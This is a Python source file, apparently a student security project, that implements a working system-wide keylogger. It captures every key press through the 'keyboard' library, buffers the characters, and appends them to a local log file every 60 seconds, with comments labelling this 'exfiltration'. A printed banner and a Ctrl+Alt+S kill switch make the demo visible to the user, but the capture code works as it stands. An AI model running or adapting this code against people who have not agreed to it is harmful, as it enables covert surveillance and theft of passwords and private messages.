"""
Computer Security Project: Simple Keylogger
Using 'keyboard' library - more reliable than pynput
"""
import keyboard
import threading
import time
import os

class Keylogger:
    def __init__(self, log_file="log.txt"):
        self.log_file = log_file
        self.buffer = []
        self.running = True
        self.last_write = time.time()
        self.write_interval = 60
    
    def on_key(self, event):
        """Process each key press"""
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            
            # Handle regular characters
            if len(key) == 1:
                self.buffer.append(key)
            
            # Handle special keys
            elif key == 'backspace':
                if len(self.buffer) > 0:
                    self.buffer.pop()
            
            elif key == 'enter':
                self.buffer.append('\n')
            
            elif key == 'space':
                self.buffer.append(' ')
            
            elif key == 'tab':
                self.buffer.append('    ')
    
    def write_buffer(self):
        """Write buffer to file (exfiltration)"""
        if self.buffer:
            with open(self.log_file, 'a') as f:
                f.write(''.join(self.buffer))
                f.write(f'\n[--- Written at {time.ctime()} ---]\n')
            print(f"[+] {len(self.buffer)} chars written to {self.log_file}")
            self.buffer = []
    
    def timer_loop(self):
        """60-second heartbeat thread"""
        while self.running:
            time.sleep(self.write_interval)
            if self.running:
                self.write_buffer()
    
    def start(self):
        """Start the keylogger"""
        print("="*50)
        print("KEYLOGGER DEMONSTRATION")
        print("="*50)
        print("[*] Keylogger is RUNNING")
        print("[*] Kill switch: Press Ctrl+Alt+S to stop")
        print(f"[*] Auto-write to file: Every {self.write_interval} seconds")
        print(f"[*] Log file: {self.log_file}")
        print("-"*50)
        
        # Start timer thread for 60-second exfiltration
        timer_thread = threading.Thread(target=self.timer_loop, daemon=True)
        timer_thread.start()
        
        # Register kill switch (Ctrl+Alt+S)
        keyboard.add_hotkey('ctrl+alt+s', self.stop)
        
        # Start listening for keys
        keyboard.on_press(self.on_key)
        
        # Keep the program running
        keyboard.wait()
    
    def stop(self):
        """Safe shutdown with final buffer write"""
        print("\n" + "="*50)
        print("[*] Kill switch activated! Shutting down...")
        print("="*50)
        
        self.running = False
        
        # Write any remaining buffer to file
        if self.buffer:
            with open(self.log_file, 'a') as f:
                f.write(''.join(self.buffer))
                f.write(f'\n[--- FINAL BUFFER at {time.ctime()} ---]\n')
            print(f"[+] Final buffer ({len(self.buffer)} chars) written to {self.log_file}")
        
        print(f"[+] Log file saved as: {self.log_file}")
        print("[*] Keylogger terminated safely")
        os._exit(0)


# ============= MAIN EXECUTION =============
if __name__ == "__main__":
    # Create and start the keylogger
    logger = Keylogger("recipe_log.txt")  # This saves the recipe
    
    import sys
    print(sys.executable)

    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        print(f"Error: {e}")
        input("Press Enter to exit...")